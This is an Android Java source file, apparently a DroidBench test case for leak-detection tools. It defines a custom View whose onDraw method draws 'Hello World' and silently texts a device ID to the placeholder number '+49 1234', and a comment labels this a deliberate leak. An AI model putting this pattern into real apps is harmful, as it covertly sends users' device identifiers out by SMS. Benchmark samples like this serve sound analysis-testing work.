package de.ecspride;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.telephony.SmsManager;
import android.util.AttributeSet;
import android.view.View;

public class MyView extends View {

	public static String deviceID = "";
	
	public MyView(Context context, AttributeSet attrs) {
		super(context, attrs);
	}
	
	@SuppressLint("DrawAllocation")
	@Override
	protected void onDraw(Canvas canvas) {
		super.onDraw(canvas);
		Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
		paint.setColor(Color.LTGRAY);
		
		canvas.drawPaint(paint);
		
		paint.setColor(Color.RED);
		paint.setTextSize(10);
		canvas.drawText("Hello World", 10, 10, paint);
		
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, deviceID, null, null); //source, sink, leak
	}
	
	@Override
	protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
		super.onMeasure(widthMeasureSpec, heightMeasureSpec);
		setMeasuredDimension(800, 1500);
	}

}
